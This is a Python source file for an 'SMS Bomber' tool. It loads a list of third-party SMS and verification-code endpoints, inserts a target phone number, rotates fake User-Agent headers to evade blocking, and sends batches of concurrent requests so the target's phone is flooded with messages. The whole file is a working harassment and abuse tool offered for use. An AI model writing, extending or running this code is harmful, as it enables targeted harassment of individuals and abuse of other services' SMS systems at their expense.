import asyncio
import json
import os
import random
import aiohttp
from fake_useragent import UserAgent
from utils.logger import setup_logger
from config import REQUEST_TIMEOUT, MAX_CONCURRENT_REQUESTS

logger = setup_logger()
ua = UserAgent()

class SMSBomber:
    def __init__(self):
        self.name = "SMS Bomber"
        self.apis = self._load()

    def _load(self):
        p = os.path.join(os.path.dirname(os.path.abspath(__file__)), "data", "sms_apis.json")
        try:
            with open(p, "r") as f:
                return json.load(f)
        except Exception as e:
            logger.error(f"[SMS] load fail: {e}")
            return []

    def _build(self, api, phone):
        url = api["url"].replace("{phone}", phone)
        method = api.get("method", "POST").upper()
        headers = dict(api.get("headers", {}))
        try:
            headers["User-Agent"] = ua.random
        except Exception:
            headers["User-Agent"] = "Mozilla/5.0"
        raw = json.dumps(api.get("body", {})).replace("{phone}", phone)
        try:
            body = json.loads(raw)
        except Exception:
            body = {}
        return url, method, headers, body

    async def _send(self, session, api, phone, sem):
        async with sem:
            try:
                url, method, headers, body = self._build(api, phone)
                kw = {"headers": headers, "timeout": REQUEST_TIMEOUT}
                if method == "POST":
                    kw["json"] = body
                async with session.request(method, url, **kw) as r:
                    name = api.get("name", "API")
                    if r.status < 400:
                        logger.info(f"[SMS] OK {name} -> {phone}")
                        return 1
                    logger.warning(f"[SMS] {name} -> {r.status}")
                    return 0
            except Exception as e:
                logger.error(f"[SMS] err: {e}")
                return 0

    async def bomb(self, phone, count=50, threads=10, delay=0.3):
        if not self.apis:
            logger.error("[SMS] no APIs loaded")
            return 0
        sem = asyncio.Semaphore(min(threads, MAX_CONCURRENT_REQUESTS))
        sent = 0
        async with aiohttp.ClientSession() as s:
            for _ in range(count):
                api = random.choice(self.apis)
                sent += await self._send(s, api, phone, sem)
                await asyncio.sleep(delay)
        logger.info(f"[SMS] total {sent}/{count}")
        return sent
